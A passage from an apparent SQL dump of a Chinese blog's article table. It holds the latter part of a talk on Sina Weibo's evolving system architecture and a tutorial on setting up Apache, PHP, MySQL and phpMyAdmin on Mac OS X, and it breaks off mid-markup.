style=&quot;color:#ff00&quot;&gt;第一版本的技术细节，典型的LAMP架构，是使用Myisam搜索引擎，它的优点就是速度非常快。另外一个是MPSS，就是多个端口可以布置在服务器上。&lt;/span&gt;为什么使用MPSS？假如说我们做一个互联网应用，这个应用里面有三个单元，我们可以由三种部署方式。我们可以把三个单元部署在三台服务器上，另外一种部署模式就是这三个单元部署在每个服务器上都有。这个解决了两个问题，一个是负载均衡，因为每一个单元都有多个结点处理，另外一个是可以防止单点故障。如果我们按照模式一来做的话，任何一个结点有故障就会影响我们系统服务，如果模式二的话，任何一个结点发生故障我们的整体都不会受到影响的。&lt;br /&gt;&lt;br /&gt;我们微博第一版上线之后，用户非常喜欢这个产品，用户数增长非常迅速。我们技术上碰到几个问题。第一个问题是发表会出现延迟现象，尤其是明星用户他的粉丝多。另外系统处理明星用户发表时候的延迟，可能会影响到其他的用户，因为其他的用户同一时间发表的话，也会受到这个系统的影响。我们就考虑这个系统怎么改进。&lt;span style=&quot;color:#ff00&quot;&gt;首先是推模式，这肯定是延迟的首要原因，我们要把这个问题解决掉&lt;/span&gt;。其次我们的用户越来越多，这个数据库表从一百万到一亿，数据规模不一样处理方式是有差别的。我们第一版单库单表的模式，当用户数量增多的时候，它不能满足就需要进行拆分。&lt;span style=&quot;color:#ff00&quot;&gt;第二个是锁表的问题，我们考虑的是更改引擎。另外一个是发表过慢，我们考虑的是异步模式。&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;第二版我们进行了模块化，我们首先做了一个层，做了拆分，最右边的发表做了异步模式。第二个服务层，我们把微博基础的单元设计成服务层一个一个模块，最大是对推模式进行了改进。&lt;span style=&quot;color:#ff00&quot;&gt;首先看一下投递模式的优化，首先我们要思考推模式，如果我们做一下改进把用户分成有效和无效的用户&lt;/span&gt;。我们一个用户比如说有一百个粉丝，我发一条微博的时候不需要推给一百个粉丝，因为可能有50个粉丝不会马上来看，这样同步推送给他们，相当于做无用功。我们把用户分成有效和无效之后，我们把他们做一下区分，比如说当天登陆过的人我们分成有效用户的话，只需要发送给当天登陆过的粉丝，这样压力马上就减轻了，另外投递的延迟也减小了。&lt;br /&gt;&lt;br /&gt;我们再看数据的拆分，数据拆分有很多方式，很多互联网产品最常用的方法，比如说如可以按照用户的UID来拆分。但是微博用户的一个特点就是说大家访问的都是最近的服务器，所以我们考虑&lt;span style=&quot;color:#ff00&quot;&gt;微博的数据我们按照时间拆分，比如说一个月发一张表，这样就解决了我们不同时间的惟度可以有不同的拆分方式。第二个考虑就是要把内容和索引分开存放&lt;/span&gt;。假如说一条微博发表的地址是索引数据，内容是内容数据。假如说我们分开的话，内容就简单的变成了一种&lt;span style=&quot;color:#ff00&quot;&gt;key-value的方式&lt;/span&gt;，key-value是最容易扩展的一种数据。比如说一个用户发表了一千条微博，这一千条微博我们接口前端要分页放，比如说用户需要访问第五页，那我们需要迅速定位到这个记录。假如说我们把这个索引拆分成一个月一张表，我们记录上很难判断第五页在哪张表里，我们需要索引所有的表。如果这个地方不能拆分，那我们系统上就会有一个非常大的瓶颈。最后我们想了一个方法，就是说索引上做了一个二次索引，改变我们还是按照时间拆分，但是我们把每个月记录的偏移记下来，就是一个月这个用户发表了多少条，ID是哪里，就是按照这些数据迅速把记录找出来。&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;color:#ff00&quot;&gt;异步处理&lt;/span&gt;，发表是一个非常繁重的操作，它要入库、统计索引、进入后台，如果我们要把所有的索引都做完用户需要前端等待很长的时间，如果有一个环节失败的话，用户得到的提示是发表失败，但是入库已经成功。所以我们做了一个异步操作，就是发表成功我们就提示成功，然后我们在后台慢慢的消息队列慢慢的做完。另外新浪发表了一个很重要的产品叫做MemcacheQ，我们去年做了一个对大规模部署非常有利的指令，就是stats queue，适合大规模运维。&lt;br /&gt;&lt;br /&gt;第二版我们做了这些改进之后，微博的用户和访问量并没有停止，还有很多新的问题出现。比如说系统问题，单点故障导致的雪崩，第二个是访问速度问题因为国内网络环境复杂，会有用户反映说在不同地区访问图片、js这些速度会有问题。另外一个是数据压力以及峰值，MySql复制延迟、慢查询，另外就是热门事件，比如说世界杯，可能会导致用户每秒发表的内容达到几百条。我们考虑如何改进，首先系统方面循序任意模块失败。另外静态内容，第一步我们用CDN来加速，另外数据的压力以及峰值，&lt;span style=&quot;color:#ff00&quot;&gt;我们需要将数据、功能、部署尽可能的拆分，然后提前进行容量规划。&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;另一方面我们还有平台化的需求，去年11月我们就说要做开放平台，开放平台的需求是有差异的，Web系统它有用户行为才有请求，但是API系统特别是客户端的应用，只要用户一开机就会有请求，直到他关闭电脑这种请求一直会不间断的过来，另外用户行为很难预测。&lt;br /&gt;&lt;br /&gt;系统规模在持续的增大，另外也有平台化的需求，我们新架构应该怎么做才能满足这些需要？我们看一下同行，比如说Google怎么样考虑这个问题的？&lt;span style=&quot;color:#ff00&quot;&gt;Google首席科学家讲过一句话，就是一个大的复杂的系统，应该要分解成很多小的服务。比如说我们在Google.com执行一个搜索查询的话，实际上这个操作会调动内部一百多个服务。&lt;/span&gt;因此，我们第三版的考虑就是先有服务才有接口最后才有应用，我们才能把这个系统做大。&lt;br /&gt;&lt;br /&gt;现在我们看一下第三版，首先我们把底层的东西分成基础服务，基础服务里面比如说分布式的存储，还有分层，我们做了一些去中心化、自动化的操作。在基础服务之上有平台服务，我们把微博常用的应用做成各种小的服务。然后我们还有应用服务，这个是专门考虑平台各种应用的需求。最上面我们有API，API就是新浪微博各种第三方应用都在上面跑。&lt;br /&gt;&lt;br /&gt;平台服务和应用服务是分开的，这样实现了模块隔离，即使应用服务访问量过大的话，平台服务不会首先影响。另外我们把微博的引擎进行了改进，实现了一个分层关系。&lt;span style=&quot;color:#ff00&quot;&gt;用户的关注关系，我们改成一个多惟度的索引结构&lt;/span&gt;，性能极大的提高。第四个层面就是计数器的改进，新版我们改成了基于偏移的思路，就是一个用户他原来读的一个ID比如说是10000，系统最系的ID是10002的话，我们和清楚他有两条未读。原来的版本是采用绝对技术的，这个用户有几条未读都是用一个存储结构的话，就容易产生一致性的问题，采用这种偏移的技术基本上不会出错。&lt;br /&gt;&lt;br /&gt;另外基础服务DB冷热分离多维度拆分，在微博里面我们是按照时间拆分的，但是一个大型的系统里面有很多业务需要有不同的考虑。比如说私信这个就不能按照时间来拆分，这个按照UID来拆分可能更简单。然后我们突出存储还做了一个去中心化，就是用户上传图片的速度会极大的提高，另外查看其他用户的图片速度也会极大的提高。另外是动态内容支持多IDC同时更新，这个是在国内比较新颖的。&lt;br /&gt;&lt;br /&gt;下面给大家介绍一下新浪微博怎么样打造一个高性能架构。到目前为止有五千万用户使用新浪微博，最高发表3000条以上每秒，然后一个明星用户发表的话，会被几百万用户同时读到。&lt;span style=&quot;color:#ff00&quot;&gt;这些问题的本质是我们架构需要考虑高访问量、海量数据的情况下三个问题。易于扩展、低延迟、高可用和异地分布&lt;/span&gt;。我们每天有数十亿次外部网页以及API接口的需求，我们知道微博的特点是用户请求是无法cache的。因此面对这个需求我们怎么样扩展？几点思路。第一我们的模块设计上要去状态，我们任意一个单元可以支持任意节点。另外是去中心化，避免单点及瓶颈。另外是可线性扩展。最后一个是减少模块。&lt;br /&gt;&lt;br /&gt;我们要做一个高性能的系统，要具备一个低延迟、高实时性，微博要做到高实时性这是核心的价值，实时性的核心就是让数据离CPU最近，避免磁盘的IO。我们看淘宝核心系统专家余锋说过的一句话&ldquo;&lt;span style=&quot;color:#ff00&quot;&gt;CPU访问L1就像从书桌拿一本书，L2是从书架拿一本书，L3是从客厅桌子上拿一本书，访问主存就像骑车去社区图书馆拿一书&lt;/span&gt;&rdquo;。我们微博如果要做到非常实时的话，我们就需要把数据尽量离CPU节点最近。所以我们看一下cache设计里面怎么达到这个目标。首先INBOX，这个数据我们需要放再一个最快的地方，因为用户随时访问。OutBOX里面的最近发表就是L1cache，还有一个是中期的，这个因为访问少一点，它可以被踢。最后一部分内容体有三部分。L0是本地的，我们需要把一些经常访问的，比如说明星发表微博的内容体本地化，因为它被访问的概率非常大。然后L1里面存放着最近发表的，还有一个是中期的。我们通常用L2就可以了，L1我们可以理解成它就是一个存储。&lt;br /&gt;&lt;br /&gt;一个好的架构还需要举行高可用性。我们看一下业界的指标，S3是99.9%，EC2是99.5%，我们另外一个同行Facebook在这方面它是没有承诺的，就是接口可用写。微博平台目前承诺的是99.95%，就是说一天365天故障率应该小于9的小时。这个怎么达到？第一我们要做容量规划，地个是要做好监控以及入口的管理，就是说有些服务如果访问量过了的话，我们要有一个开关可以拦住他。我们通过这个图表可以清楚的看到，比如说我们要做L1的cache，我们剩余空间有多少，比如说80%，就说明这个数据有可能会丢失，有可能会对我们的系统造成影响。&lt;br /&gt;&lt;br /&gt;另外一个层面就是接口监控，我们目前有Google维度的接口监控，包括访问错误失败率。然后要做架构，给大家一个很重要的经验分享，就是说监控的指标尽量量化。比如说他延迟30秒是小问题，如果是延迟10分钟我们就要立即采取措施了，就是所有可以量化的指标都要量化。&lt;br /&gt;&lt;br /&gt;然后我们看监控怎么样更好的做？我们看亚马逊的VP说过的一句话，就是说监控系统确实特别好，可以立即告诉我们哪里有故障，但是有20%的概率我们人是会出错的。&lt;span style=&quot;color:#ff00&quot;&gt;所以我们一个大型系统就应该要为自动化设计，就是说尽可能的将一些运作自动化。比如说发布安装、服务、启用、停止&lt;/span&gt;。我们再看另外一句，Google的工程师是怎么做的。他是这么做的，比如说第一周是处理线上的业务，这一周他处理了很多事情，处理了很多系统的情况，剩下的系统问题是不需要他做的，他只要把这一周碰到的情况用程序的方法来解决，下次再碰到这种情况很简单的一个按钮就可以处理了。我们目前也在向自动化这方面努力，就是我们的工具在持续增加。&lt;br /&gt;&lt;br /&gt;另外一个异地分布，在国内网络环境下，比如说IDC灾难，机房检修甚至是机房掉电，我们也碰到过中国最好的机房也会掉电，所以要每个服务单元都能支持多机房部署。另外做多机房部署有一个好处，就是用户的访问速度会提高。多IDC分布静态内容就不说了，基本上大的互联网公司都会做，它非常成熟基本上没有什么问题，比如说图片等等的静态内容。动态内容的CDN分布是业内的难点，国内很少有公司能够做到非常成熟的多机房动态内容发布的成熟方案，它的核心就是分布式存储&lt;span style=&quot;color:#ff00&quot;&gt;。一款理想的分布式存储产品它有哪些需求呢？首先它要支持海量规模、可扩展、高性能、低延迟、高可用。第二个是需要多机房分布，能够满足国内负责的网络环境，还要具备异地容灾能力。第三个就是要调用简单，具备丰富数据库特性。因此分布式存储需要解决一个多对多的数据复制。&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;如果要做复制无非是三种策略，第一个是Master/Slave，但是它也两个缺点，第一个是Master是中心化的，如果Master在北京那广州访问就非常慢。第二个缺点是有单点风险的，比如说Master在北京，能立即迁到广州吗？这样时间窗口就丢失了，而且需要人工的干预，而且日常广州的用户访问北京的Master是有很大问题的，所以一般来说要做的非常优秀是不会考虑第一种方案的。第二种就是Multi-Master方案，它需要应用避免冲突，就是我们不能多处改变。这个对于微博来说不会特别难，我们的用户通常只会再一个地方发表微博，很难既在广州又在北京发表或者是修改自己的资料，这样的话我们应用上就可以避免这种情况。第三个就是Paxos就是可以达到强一致写，就是一条数据如果成功肯定是多个机房都成功了，这个也显而易见就是延迟性非常大。因此总结一下Multi-Master是最成熟的策略，但是它现在没有成熟的产品，因为确实没有。&lt;br /&gt;&lt;br /&gt;我们再来看微博的方案，所以我们自己实现了一个多机房同步的方案。&lt;span style=&quot;color:#ff00&quot;&gt;就是我们前端应用将数据写到数据库，再通过一个消息代理，相当于通过我们自己开发的一个技术，将数据广播到多个机房&lt;/span&gt;。这个不但可以做到两个机房，而且可以做到三个、四个。具体的方式就是通过消息广播方式将数据多点分布，就是说我们的数据提交给一个代理，这个代理帮我们把这些数据同步到多个机房，那我们应用不需要关心这个数据是怎么样同步过去的。&lt;br /&gt;&lt;br /&gt;用这种消息代理方式有什么好处呢？可以看一下Yahoo是怎么来做的？第一个是数据提供之后没有写到db之后是不会消失的，我只要把数据提交成功就可以了，不需要关心数据怎么到达机房。第二个特点YMB是一款消息代理的产品，但是它唯一神奇的地方是为广域网设计的，它可以把多机房应用归到内部，我们应用不需要关注这个问题。这个原理跟我们目前自己开发的技术相似。&lt;br /&gt;&lt;br /&gt;然后我们再看一下目前即将推出的微博平台的新架构。我们知道API大部分的请求都为了获取最新的数据。API请求有一个特点，它大目前调用都是空返回的，比如说一款手机的客户端每隔一分钟它都要调用服务器一下，就是有没有新数据，大目前的调用都是空返回，就是说不管服务器有没有数据都要调用一次。这次询问到下一次询问中间，如果有新的数据来了，你是不会马上知道的。因此我们想API能不能改用推的方式，就是客户端不需要持续的调用，如果有新数据就会推过去。技术特点，显而易见低延迟，就是从发表到接受1秒内完成，实际上可能用不了1秒。然后服务端的连接就是高并发长连接服务，就是多点都连接在我们的服务器上，这个比传统的API要大很多。&lt;br /&gt;&lt;br /&gt;我们看一下推送架构怎么从架构底层做到实时性的。&lt;span style=&quot;color:#ff00&quot;&gt;从左上角的一条微博在我们系统发布之后，我们把它放在一个消息队列里面，然后会有一个消息队列的处理程序把它拿过来，处理以后放到db里面&lt;/span&gt;。假如说我们不做持久化，因为我们推送数据也不能丢失，我们就要写一个很复杂的程序，将S数据异步去存，这样就会非常复杂，而且系统也会有不稳定的因素。从另外一个角度来说，我们做持久化也是做过测试的。我们推送整个流程可以做到100毫秒和200毫秒之间，就是说我们在这个时间能把数据推送出去。&lt;br /&gt;&lt;br /&gt;我们再看一下内部细节，就是我们收到数据之后首先要经过最上面RECEIVER。然后推到我们的引擎里面，这个引擎会做两个事情，首先会把用户的关系拿过来，然后按照用户关系马上推送给他相应的粉丝。所以我们调研方已经在那儿等待了，我们需要有一个唤醒操作，就是说在接口这儿把它唤醒，然后把它发送过去。最后是一个高并发的长连服务器，就是一台服务器支持10万以上的并发连接。最右边中间有一个圆圈叫做StreamBuffer，我们需要StreamBuffer是要保存用户最近的数据。因为用户可能会有断线的，比如说他发送数据的时候断线半分钟，我们需要把这半分钟补给他。这就是我们的推送架构。&lt;br /&gt;&lt;br /&gt;下面介绍一下平台安全部分。由于我们的接口是完全开放的，所以我们要防范很多恶意行为，有很多人担心我们接口是开放的，是不是有人通过这个接口发垃圾广告，或者是刷粉丝，我们技术架构怎么来防范这一点呢？这是我们的安全架构，做了三个层面的事情。总上面是我们有一个实时处理，比如说根据频度、内容的相似性来进行判断，判断你发的是不是广告或者是垃圾内容。中间这个是一个处理器，我们会根据一些行为进行判断，比如说如果我们只是实时拦截的话，有些行为很难防止，我们做了个离线纠正的模块，比如说他潜伏的几个月开始发广告了，我们可以事后把这些人清除掉，以保证我们平台的健康。最后是通过监控的维度来保证内容的安全。目前内容安全的架构大概是51的体系，就是说我们的实时拦截可以做到50%的防止，离线分析大概可以做到40%的防止。&lt;br /&gt;&lt;br /&gt;微博平台需要为用户提供安全及良好的体验应用，以及为开发者营造一个公平的环境，所以我们的接口需要清晰安全的规则。从一个APP调用我们的接口，需要几个阶层，需要划分不同的业务模块。第二个是安全层。第三个是权限层。这是我们平台安全的两个维度，一个接口安全，一个是内容安全。&lt;/p&gt;', 1386207802);
INSERT INTO `la_article` (`id`, `archiveid`, `content`, `updatetime`) VALUES
(12, 12, '&lt;p&gt;最近开始对linux感兴趣，刚好手边有mac book，这简直是天助我也，在网上搜索了一下，原来macos中内置了apache和php，却没有内置mysql，所以我们需要配置apache支持php，并安装mysql。&lt;br /&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;macos系统版本10.7.1 lion&lt;/span&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;&lt;br /&gt;&lt;br /&gt;&lt;/span&gt;&lt;span style=&quot;font-size:18px;font-weight:bold&quot;&gt;启动Apache&lt;/span&gt;&lt;/p&gt;&lt;p&gt;有两种方法：&lt;/p&gt;&lt;ol class=&quot; list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;打开&ldquo;系统设置偏好（System Preferences）&rdquo; -&amp;gt; &ldquo;共享（Sharing）&rdquo;-&amp;gt; &ldquo;Web共享（Web Sharing）&rdquo;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;打开&ldquo;终端（terminal）&rdquo;，然后（注意：sudo需要的密码就是系统的root帐号密码）&lt;/p&gt;&lt;p&gt;运行&ldquo;&lt;code&gt;sudo apachectl start&lt;/code&gt;&rdquo;，再输入帐号密码，这样Apache就运行了。&lt;/p&gt;&lt;p&gt;运行&ldquo;&lt;code&gt;sudo apachectl －v&lt;/code&gt;&rdquo;，你会看到Mac OS X10.6.3中的Apache版本号&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;然后在浏览器中输入&ldquo;http://localhost/&rdquo;，就可以看到出现一个内容为&ldquo;Itworks!&rdquo;的页面，它位于&ldquo;/Library（资源库）/WebServer/Documents/&rdquo;下，这是Apache默认的document根目录。&lt;br /&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;span style=&quot;color:#0070c0;&quot;&gt;注意：开启了Apache就是开启了&ldquo;Web共享&rdquo;，这时联网的用户就会通过&ldquo;http://[本地IP]/&rdquo;来访问&ldquo;/Library（资源库）/WebServer/Documents/&rdquo;目录，通过&ldquo;http://[本地IP]/~[用户名]&rdquo;来访问&ldquo;/Users/[用户名]/Sites/&rdquo;目录，可以通过设置&ldquo;系统偏好设置&rdquo;的&ldquo;安全（Security）&rdquo;中的&ldquo;防火墙（Firewall）&rdquo;来禁止这种访问&lt;/span&gt;。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;运行PHP&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;ol class=&quot;custom_num list-paddingleft-1&quot;&gt;&lt;li class=&quot;list-num-1-1 list-num-paddingleft-1&quot;&gt;&lt;p&gt;在终端中运行&ldquo;&lt;code&gt;sudo vi/etc/apache2/httpd.conf&lt;/code&gt;&rdquo;，打开Apache的配置文件。（如果不习惯操作终端和vi的可以设置在Finder中显示所有的系统隐藏文件，记得需要重启Finder，这样就可以找到对应文件，随心所欲编辑了，但需要注意的是某些文件的修改需要开启root帐号，但整体上还是在终端上使用sudo来临时获取root权限比较安全。）&lt;/p&gt;&lt;/li&gt;&lt;li class=&quot;list-num-1-2 list-num-paddingleft-1&quot;&gt;&lt;p&gt;找到&ldquo;&lt;code&gt;#LoadModule php5_modulelibexec/apache2/libphp5.so&lt;/code&gt;&rdquo;，把前面的#号去掉，保存（在命令行输入&lt;code&gt;:w&lt;/code&gt;）并退出vi（在命令行输入&lt;code&gt;:q&lt;/code&gt;）。&lt;/p&gt;&lt;/li&gt;&lt;li class=&quot;list-num-1-3 list-num-paddingleft-1&quot;&gt;&lt;p&gt;运行&ldquo;&lt;code&gt;sudo cp /etc/php.ini.default/etc/php.ini&lt;/code&gt;&rdquo;，这样就可以通过php.ini来配置各种PHP功能了。比如：&lt;/p&gt;&lt;p&gt;;通过下面两项来调整PHP提交文件的最大值，比如phpMyAdmin中导入数据的最大值&lt;/p&gt;&lt;p&gt;upload_max_filesize = 2Mpost_max_size = 8M&lt;/p&gt;&lt;p&gt;;比如通过display_errors来控制是否显示PHP程序的报错&lt;/p&gt;&lt;p&gt;display_errors = Off&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;运行&ldquo;&lt;code&gt;sudo apachectl restart&lt;/code&gt;&rdquo;，重启Apache，这样PHP就可以用了。&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;在documents根目录下，新建info.php文件 输入代码：&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;lt;?php echo phpinfo();&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;可以看到php的配置信息，表示php已经可以正常使用。&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;&lt;br /&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;安装MySQL&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;由于Mac OS X中并没有预装MySQL，所以需要自己手动安装，目前MySQL的最稳定版本是5.1。MySQL提供了MacOS X下的安装说明。&lt;/p&gt;&lt;ol class=&quot; list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;http://dev.mysql.com/downloads/mysql/5.1.html&quot;&gt;下载MySQL5.1&lt;/a&gt;。选择合适的版本，比如这里选择的是mysql-5.1.46-osx10.6-x86_64.dmg。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;运行dmg，会发现里面有4个文件。首先点击安装mysql-5.1.46-osx10.6-x86_64.pkg，这是MySQL的主安装包。一般情况下，安装文件会自动把MySQL安装到/usr/local下的同名文件夹下。比如点击运行&ldquo;mysql-5.1.46-osx10.6-x86_64.dmg&rdquo;会把MySQ安装到&ldquo;&lt;code&gt;/usr/local/mysql-5.1.46-osx10.6-x86_64&lt;/code&gt;&rdquo;中。一路默认安装完毕即可。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;点击安装第2个文件MySQLStartupItem.pkg，这样MySQL就会自动在开机时自动启动了。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;点击安装第3个文件MySQL.prefPane，这样就会在&ldquo;系统设置偏好&rdquo;中看到名为&ldquo;MySQL&rdquo;的ICON，通过它就可以设置MySQL开始还是停止，以及是否开机时自动运行。到这里MySQL就基本安装完毕了。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;通过运行&ldquo;&lt;code&gt;sudo vi/etc/bashrc&lt;/code&gt;&rdquo;，在bash的配置文件中加入&lt;code&gt;mysql&lt;/code&gt;和&lt;code&gt;mysqladmin&lt;/code&gt;的别名&lt;/p&gt;&lt;pre&gt;&lt;code&gt;#mysql &lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;alias mysql=&amp;#39;/usr/local/mysql/bin/mysql&amp;#39; &lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;alias mysqladmin=&amp;#39;/usr/local/mysql/bin/mysqladmin&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;这样就可以在终端中比较简单地通过命令进行相应的操作，比如安装完毕之后MySQL的&lt;code&gt;root&lt;/code&gt;默认密码为空，如果要设置密码可以在终端运行&ldquo;&lt;code&gt;mysqladmin -u root password &amp;quot;mysqlpassword&amp;quot;&lt;/code&gt;来设置，其中mysqlpassword即root的密码。&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;h3&gt;&lt;a name=&quot;t1&quot;&gt;&lt;/a&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;使用phpMyAdmin&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;a href=&quot;http://www.phpmyadmin.net/&quot;&gt;phpMyAdmin&lt;/a&gt;是用PHP开发的管理MySQL的程序，非常的流行和实用。能够实用phpMyAdmin管理MySQL是检验前面几步成果的非常有效方式。&lt;/p&gt;&lt;ol class=&quot;custom_num list-paddingleft-1&quot;&gt;&lt;li class=&quot;list-num-1-1 list-num-paddingleft-1&quot;&gt;&lt;p&gt;&lt;a href=&quot;http://www.phpmyadmin.net/home_page/downloads.php&quot;&gt;下载phpMyAdmin&lt;/a&gt;。选择合适的版本，比如我选择的是phpMyAdmin-3.3.2-all-languages.tar.bz2这个版本。&lt;/p&gt;&lt;/li&gt;&lt;li class=&quot;list-num-1-2 list-num-paddingleft-1&quot;&gt;&lt;p&gt;把&ldquo;下载（downloads）&rdquo;中的phpMyAdmin-3.32-all-languages文件夹复制到&ldquo;&lt;code&gt;/Users/[用户名]/Site&lt;/code&gt;s&rdquo;中，名改名为phpmyadmin。&lt;/p&gt;&lt;/li&gt;&lt;li class=&quot;list-num-1-3 list-num-paddingleft-1&quot;&gt;&lt;p&gt;复制&ldquo;&lt;code&gt;/Users/[用户名]/Sites/phpmyadmin/&lt;/code&gt;&rdquo;中的config.sample.inc.php，并命名为config.inc.php&lt;/p&gt;&lt;/li&gt;&lt;li class=&quot;list-num-1-4 list-num-paddingleft-1&quot;&gt;&lt;p&gt;打开config.inc.php,做如下修改：&lt;/p&gt;&lt;pre&gt;用于Cookie加密，随意的长字符串$cfg[&#039;blowfish_secret&#039;] = &#039;&#039;; &lt;/pre&gt;&lt;pre&gt;当phpMyAdmin中出现&ldquo;#2002 无法登录 MySQL 服务器&rdquo;时，请把localhost改成127.0.0.1就ok了，&lt;/pre&gt;&lt;pre&gt;这是因为MySQL守护程序做了IP绑定（bind-address =127.0.0.1）造成的&lt;/pre&gt;&lt;pre&gt;$cfg[&#039;Servers&#039;][$i][&#039;host&#039;] = &#039;localhost&#039;;&lt;/pre&gt;&lt;pre&gt;把false改成true，这样就可以访问无密码的MySQL了，即使MySQL设置了密码也可以这样设置，然后在登录phpMyAdmin时输入密码&lt;/pre&gt;&lt;pre&gt;$cfg[&#039;Servers&#039;][$i][&#039;AllowNoPassword&#039;] = false;&lt;/pre&gt;&lt;/li&gt;&lt;li class=&quot;list-num-1-5 list-num-paddingleft-1&quot;&gt;&lt;p&gt;这样就可以通过&lt;code&gt;http://localhost/~[用户名]/phpmyadmin&lt;/code&gt;访问phpMyAdmin了。这个时候就看到一个提示&ldquo;无法加载mcrypt 扩展，请检查您的 PHP 配置。&rdquo;，这就涉及到下一节安装MCrypt扩展了。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;配置PHP的MCrypt扩展&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;a href=&quot;http://mcrypt.sourceforge.net/&quot;&gt;MCrypt&lt;/a&gt;是一个功能强大的加密算法扩展库，它包括有22种算法，phpMyAdmin依赖这个PHP扩展库。但是它在MacOS X下的安装却不那么友善，具体如下：&lt;/p&gt;&lt;ol class=&quot;custom_num list-paddingleft-1&quot;&gt;&lt;li class=&quot;list-num-1-1 list-num-paddingleft-1&quot;&gt;&lt;p&gt;下载并解压&lt;a href=&quot;http://sourceforge.net/projects/mcrypt/files/Libmcrypt/&quot;&gt;libmcrypt-2.5.8.tar.bz2&lt;/a&gt;。&lt;/p&gt;&lt;/li&gt;&lt;li class=&quot;list-num-1-2 list-num-paddingleft-1&quot;&gt;&lt;p&gt;在终端执行如下命令（注意如下命令需要安装&lt;a href=&quot;http://developer.apple.com/xcode/&quot;&gt;xcode&lt;/a&gt;支持）&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;cd ~/Downloads/libmcrypt-2.5.8/\r\n./configure --disable-posix-threads --enable-static\r\nmake\r\nsudo make install&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;/li&gt;&lt;li class=&quot;list-num-1-3 list-num-paddingleft-1&quot;&gt;&lt;p&gt;下载并解压&lt;a href=&quot;http://us2.php.net/get/php-5.3.1.tar.bz2/from/a/mirror&quot;&gt;PHP源码文件php-5.3.1.tar.bz2&lt;/a&gt;。&lt;/p&gt;&lt;/li&gt;&lt;li class=&quot;list-num-1-4 list-num-paddingleft-1&quot;&gt;&lt;p&gt;在终端执行如下命令：&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;cd ~/Downloads/php-5.3.1/ext/mcrypt\r\nphpize\r\n./configure\r\nmake\r\ncd modules\r\nsudo cp mcrypt.so /usr/lib/php/extensions/no-debug-non-zts-20090626/&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;打开php.ini&lt;/p&gt;&lt;pre&gt;&lt;code&gt;sudo vi /etc/php.ini&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在php.ini中加入如下代码，并保存后退出，然后重启Apache&lt;/p&gt;&lt;pre&gt;&lt;code&gt;extension=/usr/lib/php/extensions/no-debug-non-zts-20090626/mcrypt.so&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;当你再访问&lt;code&gt;http://localhost/phpmyadmin&lt;/code&gt;时，你会发现&ldquo;无法加载 mcrypt扩展，请检查您的 PHP 配置。&rdquo;的提示没有了，这就表示MCrypt扩展库安装成功了。&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h3&gt;&lt;a name=&quot;t2&quot;&gt;&lt;/a&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;设置虚拟主机&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;&lt;ol class=&quot; 